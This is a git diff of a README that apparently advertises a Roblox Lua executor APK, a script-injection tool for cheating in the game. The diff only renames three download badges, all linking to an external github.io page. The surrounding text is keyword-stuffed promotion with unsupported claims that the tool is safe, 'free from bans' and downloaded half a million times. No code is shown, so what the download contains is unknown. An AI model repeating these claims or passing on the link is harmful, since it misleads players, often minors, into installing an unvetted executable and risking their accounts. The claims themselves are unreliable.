@@ -8,7 +8,7 @@
 
 This **roblox lua executor online**-inspired app brings desktop-level power directly to your device without compromising security. It's completely free from bans in most cases when used responsibly, and the community loves its clean interface. Ready to level up your experience?
 
-[![Download](https://img.shields.io/badge/Download-Cryptic_Executor_APK-success?style=for-the-badge)](https://luaexecs.github.io/lua/)
+[![Download](https://img.shields.io/badge/Download-Lua_Executor_APK-success?style=for-the-badge)](https://luaexecs.github.io/lua/)
 
 ## Features
 
@@ -45,7 +45,7 @@ In a crowded market of executors, ours rises above the rest. Here's why players 
 
 Choose the **best lua executor** that grows with your needs.
 
-[![Download](https://img.shields.io/badge/Download-Now-success?style=for-the-badge)](https://luaexecs.github.io/lua/)
+[![Download](https://img.shields.io/badge/Download-Lua_Executor_APK-success?style=for-the-badge)](https://luaexecs.github.io/lua/)
 
 ## Benefits of Using Our Executor
 
@@ -221,7 +221,7 @@ This **lua executor** represents the pinnacle of what's possible in Roblox scrip
 
 With half a million downloads and counting, join the growing community that's redefining Roblox gameplay. Download today and unlock your true potential!
 
-[![Download](https://img.shields.io/badge/Download-Now-success?style=for-the-badge)](https://luaexecs.github.io/lua/)
+[![Download](https://img.shields.io/badge/Download-Lua_Executor_APK-success?style=for-the-badge)](https://luaexecs.github.io/lua/)
 
 ## Follow Us
 
